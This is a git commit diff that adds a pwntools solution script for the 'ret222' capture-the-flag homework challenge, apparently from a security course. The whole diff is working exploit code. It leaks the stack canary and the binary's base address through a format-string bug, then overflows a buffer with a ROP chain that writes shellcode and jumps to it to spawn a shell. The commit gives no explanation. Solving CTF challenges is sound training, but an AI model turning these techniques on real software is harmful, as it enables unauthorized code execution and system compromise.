e8e3444bd83bd707325adb6f5b1d0db61769bf6c
ss8651twtw <ss8651twtw@gmail.com>
2018-06-23 16:15:14 +0800

    Solve ret222

--- site/csie.ctf.tw/hw0/ret222/hack.py
+++ site/csie.ctf.tw/hw0/ret222/hack.py
@@ -3,14 +3,47 @@
 from pwn import *
 
 r = process('./ret222')
-raw_input('#')
 
-r.recvuntil('> ')
-r.sendline('1')
-r.recvuntil(':')
-r.sendline('%p')
-r.recvuntil('> ')
-r.sendline('2')
-print r.recv()
+context.arch = 'amd64'
+
+def setname(data):
+    r.sendlineafter('>', '1')
+    r.sendafter(':', data)
+
+def showinfo():
+    r.sendlineafter('>', '2')
+    r.recvuntil(':')
+
+def savedata(data):
+    r.sendlineafter('>', '3')
+    r.sendlineafter(':', data)
+
+def ex():
+    r.sendlineafter('>', '4')
+
+setname("%23$p")
+showinfo()
+canary = int(r.recvuntil('*')[2:-1], 16)
+log.info(hex(canary))
+
+setname("%24$p")
+showinfo()
+base = int(r.recvuntil('*')[2:-1], 16) - 0xd40
+log.info(hex(base))
+
+name = base + 0x202020
+main = base + 0xc00
+gets = base + 0x908
+pop_rdi = base + 0xda3
+
+payload = 'a' * 136 + flat(canary, 'deadbeef', pop_rdi, name, gets, main)
+savedata(payload)
+ex()
+
+r.sendline(asm(shellcraft.sh()))
+
+payload = 'a' * 136 + flat(canary, 'deadbeef', name)
+savedata(payload)
+ex()
 
 r.interactive()
